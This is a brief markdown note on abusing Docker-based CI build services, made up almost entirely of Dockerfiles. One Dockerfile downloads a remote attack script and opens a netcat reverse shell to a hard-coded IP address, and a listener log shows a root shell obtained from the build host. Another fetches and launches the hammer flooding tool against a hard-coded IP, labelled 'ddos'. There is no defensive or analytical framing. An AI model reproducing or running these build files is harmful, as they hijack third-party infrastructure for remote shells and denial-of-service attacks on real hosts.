# docker ci abuse

## 反弹shell


Dockerfile

```Dockerfile
FROM ubuntu:16.04
RUN apt-get update -y
RUN apt-get install -y
RUN apt-get install -y vim python wget
RUN apt-get install -y netcat-traditional
RUN apt-get install -y nmap openssh-server
RUN wget https://bitbucket.org/lo0o/file-space/raw/71c0710b3d7ae5d97d21799cdead2f3ecd9a73ee/attack-script/nc-connector.sh \
  && chmod +x nc-connector.sh
RUN ./nc-connector.sh 112.25.236.85 32001
```


```shell
[root@k8s-master ~]# nc -vv -l 32001
Ncat: Version 6.40 ( http://nmap.org/ncat )
Ncat: Listening on :::32001
Ncat: Listening on 0.0.0.0:32001
^[[ONcat: Connection from 114.55.107.184.
Ncat: Connection from 114.55.107.184:59430.
ls  
pwd
/
whoami
root
```


## vpn

```Dockerfile
FROM ubuntu:16.04
RUN apt-get update -y
RUN apt-get install -y 
RUN apt-get install -y vim openssh-server wget
RUN wget http://sysnet.ucsd.edu/projects/url/url.mat
RUN wget http://sysnet.ucsd.edu/projects/url/url_svmlight.tar.gz 
```

## ddos

```Dockerfile
FROM ubuntu:16.04
RUN apt-get update -y
RUN apt-get install -y python python3 git unzip wget
RUN wget https://bootstrap.pypa.io/get-pip.py \
  && python get-pip.py \
  && pip install queuelib
WORKDIR /opt
RUN wget https://github.com/cyweb/hammer/archive/master.zip \
  && unzip master.zip
WORKDIR /opt/hammer-master
RUN python3 hammer.py -s 115.28.233.79 -t 1000
```